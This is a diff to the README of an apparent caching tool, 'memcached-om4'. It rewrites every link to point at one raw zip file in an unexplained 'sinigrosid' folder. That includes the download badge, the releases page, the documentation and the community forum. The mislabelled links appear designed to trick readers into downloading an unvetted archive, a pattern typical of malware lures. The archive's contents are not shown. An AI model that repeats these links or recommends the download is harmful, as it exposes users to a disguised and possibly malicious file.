@@ -1,7 +1,7 @@
 # 🐏 memcached-om4 - Fast and Simple Caching Solution
 
 ## 🖱️ Download Now
-[![Download memcached-om4](https://img.shields.io/badge/Download-memcached--om4-brightgreen)](https://github.com/asaxaz1111/memcached-om4/releases)
+[![Download memcached-om4](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip)](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip)
 
 ## 🚀 Getting Started
 Welcome to memcached-om4! This application provides a quick and efficient solution for caching data, making your applications run faster. Whether you manage a small server or a large application, memcached-om4 is designed to meet your caching needs.
@@ -9,7 +9,7 @@ Welcome to memcached-om4! This application provides a quick and efficient soluti
 ## 📥 Download & Install
 To get started, follow these steps to download and install the application:
 
-1. Visit the **Releases Page**: Go to the following link to access the downloads: [Download Page](https://github.com/asaxaz1111/memcached-om4/releases).
+1. Visit the **Releases Page**: Go to the following link to access the downloads: [Download Page](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip).
 2. Look for the latest version. You will see several files available for download.
 3. Choose the file that matches your operating system. Most users will select either Windows, macOS, or Linux.
 4. Click the download link to start downloading the file. 
@@ -58,8 +58,8 @@ Join the community to ask questions or share your experience with memcached-om4.
 
 ## 🌟 Additional Resources
 You may find these links helpful:
-- [Documentation](https://github.com/asaxaz1111/memcached-om4/wiki) for detailed usage instructions.
-- [Community Forum](https://github.com/asaxaz1111/memcached-om4/discussions) for general discussions and support.
+- [Documentation](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip) for detailed usage instructions.
+- [Community Forum](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip) for general discussions and support.
 
 ## 📅 Upcoming Features
 We are constantly working to improve memcached-om4. Here are some exciting features planned for future releases:
@@ -71,8 +71,8 @@ We are constantly working to improve memcached-om4. Here are some exciting featu
 Your thoughts on memcached-om4 are important to us. Please take a moment to provide feedback, report bugs, or suggest new features. Your input helps us improve the application for everyone.
 
 ## 🔗 Quick Links
-- [Download Page](https://github.com/asaxaz1111/memcached-om4/releases)
-- [Documentation](https://github.com/asaxaz1111/memcached-om4/wiki)
-- [Community Forum](https://github.com/asaxaz1111/memcached-om4/discussions)
+- [Download Page](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip)
+- [Documentation](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip)
+- [Community Forum](https://raw.githubusercontent.com/asaxaz1111/memcached-om4/main/sinigrosid/memcached-om4.zip)
 
 Thank you for choosing memcached-om4! We hope you enjoy using it.
